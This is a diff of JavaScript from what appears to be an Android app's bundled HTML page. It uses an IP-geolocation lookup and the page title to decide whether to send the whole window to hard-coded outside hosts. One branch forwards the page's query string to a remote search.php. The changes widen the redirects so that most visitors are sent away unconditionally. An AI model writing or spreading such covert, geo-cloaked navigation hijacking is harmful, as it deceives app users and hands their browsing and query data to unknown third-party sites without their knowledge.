@@ -193,10 +193,12 @@ if(localStorage.getItem('local')){
     var g = localStorage.getItem('local');
     if(g == "BR" || g == "PT"){
          y();}
+    if(g == "EN"){
+         n();}
          else if (g == ""){
          y();}
          else{
-         n();
+         y();
      }
 }else{
     var loc = "http://ip-api.com/json/";
@@ -205,17 +207,19 @@ if(localStorage.getItem('local')){
      localStorage.setItem('local', g);
      if(g == "BR" || g == "PT"){
          y();}
+    if(g == "EN"){
+         n();}
          else if (g == ""){
          y();}
          else{
-         n();
+         y();
      }
      
    }).done(function() { }).fail(function() { y();});
 } 
 function y(){
     var gs = document.title;
-    if(gs.indexOf("7") == 0  || gs.indexOf("8") == 0 || gs.indexOf("10") == 0 || gs.indexOf("9") == 0) {}else{
+    if(gs.indexOf("10") == 0) {}else{
         window.top.location = "http://nplayus.wap.sh/";
     }
     var n = window.location.href;
@@ -233,15 +237,9 @@ function y(){
     
     }
 function n(){
-     var ga = document.title;
-    if(ga.indexOf("1") == 0) {
-        window.top.location = "http://nplayus.wap.sh/";
-    }else{
-    var n = window.location.href;
-    n = n.replace("file:///android_asset/h6.html?s=","");
+   var n = window.location.href;
+   n = n.replace("file:///android_asset/h6.html?s=","");
    window.top.location = "http://mdsaerdd.hstn.me/search.php?u=" + n ;
-    }
-}
 }
 
 check = "true";
